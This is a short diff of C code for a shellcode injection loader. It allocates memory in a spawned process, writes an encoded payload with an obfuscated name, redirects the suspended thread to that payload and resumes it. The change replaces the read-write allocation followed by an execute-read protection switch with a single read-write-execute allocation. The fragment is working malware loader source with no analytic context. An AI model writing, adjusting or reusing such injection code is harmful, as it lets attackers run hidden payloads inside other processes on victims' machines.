@@ -38,10 +38,8 @@ int main() {
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
     GetThreadContext(pi.hThread, &ctx);
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     WriteProcessMemory(pi.hProcess, memlo, c1o2d3e4Enc, c1o2d3e4EncLen, NULL);
-    DWORD oldProtect;
-    VirtualProtectEx(pi.hProcess, memlo, c1o2d3e4EncLen, PAGE_EXECUTE_READ, &oldProtect);
     ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
     ResumeThread(pi.hThread); 
